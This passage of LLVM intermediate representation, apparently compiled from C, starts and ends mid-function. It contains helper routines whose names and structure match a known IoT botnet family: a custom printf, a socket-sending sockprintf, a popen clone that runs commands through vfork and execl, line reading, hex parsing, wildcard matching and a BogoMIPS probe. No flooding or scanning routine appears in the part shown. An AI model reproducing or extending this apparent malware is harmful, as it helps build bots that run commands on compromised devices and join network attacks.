  %.162 = phi i32 [ %152, %149 ], [ %67, %59 ], [ %83, %79 ], [ %99, %95 ], [ %115, %111 ], [ %131, %127 ], [ %148, %143 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %149 ], [ %.2.lcssa, %59 ], [ %.2.lcssa, %79 ], [ %.2.lcssa, %95 ], [ %.2.lcssa, %111 ], [ %.2.lcssa, %127 ], [ %.2.lcssa, %143 ], [ %.2.lcssa, %.critedge ]
  %154 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %25

; <label>:155:                                    ; preds = %27, %25
  %156 = icmp eq i8** %0, null
  br i1 %156, label %159, label %157

; <label>:157:                                    ; preds = %155
  %158 = load i8*, i8** %0, align 8
  store i8 0, i8* %158, align 1
  br label %159

; <label>:159:                                    ; preds = %155, %157
  %160 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %160)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #3
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #3
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #15
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i64 @strlen(i8* %5) #15
  %12 = call i64 @send(i32 %0, i8* %5, i64 %11, i32 16384) #3
  %13 = trunc i64 %12 to i32
  call void @free(i8* %5) #3
  ret i32 %13
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8* nocapture readonly) local_unnamed_addr #1 {
  %3 = alloca [2 x i32], align 4
  %4 = load i8, i8* %1, align 1
  switch i8 %4, label %78 [
    i8 114, label %5
    i8 119, label %5
  ]

; <label>:5:                                      ; preds = %2, %2
  %6 = getelementptr inbounds i8, i8* %1, i64 1
  %7 = load i8, i8* %6, align 1
  %8 = icmp eq i8 %7, 0
  br i1 %8, label %9, label %78

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 0
  %11 = call i32 @pipe(i32* nonnull %10) #3
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %78, label %13

; <label>:13:                                     ; preds = %9
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = icmp eq i32* %14, null
  br i1 %15, label %16, label %26

; <label>:16:                                     ; preds = %13
  %17 = call i32 @getdtablesize() #3
  %18 = icmp slt i32 %17, 1
  br i1 %18, label %78, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #3
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %78, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #16
  switch i32 %27, label %61 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #3
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #3
  br label %78

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #3
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #3
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #3
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #3
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #3
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #3
  br label %59

; <label>:59:                                     ; preds = %55, %45
  %60 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.304, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.305, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.306, i64 0, i64 0), i8* %0, i8* null) #3
  call void @_exit(i32 127) #17
  unreachable

; <label>:61:                                     ; preds = %26
  %62 = load i8, i8* %1, align 1
  %63 = icmp eq i8 %62, 114
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %10, align 4
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @close(i32 %67) #3
  br label %74

; <label>:69:                                     ; preds = %61
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %10, align 4
  %73 = call i32 @close(i32 %72) #3
  br label %74

; <label>:74:                                     ; preds = %69, %64
  %.011 = phi i32 [ %65, %64 ], [ %71, %69 ]
  %75 = load i32*, i32** @fdopen_pids, align 8
  %76 = sext i32 %.011 to i64
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  store i32 %27, i32* %77, align 4
  br label %78

; <label>:78:                                     ; preds = %19, %16, %9, %5, %2, %74, %28
  %.0 = phi i32 [ %.011, %74 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #3
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #3
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #3
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #3
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #3
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #3
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #3
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #18
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #5

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #3
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #15
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #15
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #3
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #15
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) local_unnamed_addr #1 {
  %2 = alloca [4096 x i8], align 16
  %3 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.307, i64 0, i64 0), i32 0) #3
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %5 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %24
  call void @uppercase(i8* nonnull %4)
  %strncmp = call i32 @strncmp(i8* nonnull %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.308, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %7, label %24

; <label>:7:                                      ; preds = %.lr.ph
  %8 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 8
  br label %9

; <label>:9:                                      ; preds = %.critedge, %7
  %.0 = phi i8* [ %8, %7 ], [ %11, %.critedge ]
  %10 = load i8, i8* %.0, align 1
  switch i8 %10, label %.preheader.preheader [
    i8 32, label %.critedge
    i8 9, label %.critedge
    i8 58, label %.critedge
  ]

.preheader.preheader:                             ; preds = %9
  br label %.preheader

.critedge:                                        ; preds = %9, %9, %9
  %11 = getelementptr inbounds i8, i8* %.0, i64 1
  br label %9

.preheader:                                       ; preds = %.preheader.preheader, %16
  %12 = call i64 @strlen(i8* %.0) #15
  %13 = add i64 %12, -1
  %14 = getelementptr inbounds i8, i8* %.0, i64 %13
  %15 = load i8, i8* %14, align 1
  switch i8 %15, label %17 [
    i8 13, label %16
    i8 10, label %16
  ]

; <label>:16:                                     ; preds = %.preheader, %.preheader
  store i8 0, i8* %14, align 1
  br label %.preheader

; <label>:17:                                     ; preds = %.preheader
  %18 = call i8* @strchr(i8* nonnull %.0, i32 46) #15
  %19 = icmp eq i8* %18, null
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  store i8 0, i8* %18, align 1
  br label %21

; <label>:21:                                     ; preds = %17, %20
  %22 = call i8* @strcpy(i8* %0, i8* nonnull %.0) #3
  %23 = call i32 @close(i32 %3) #3
  br label %28

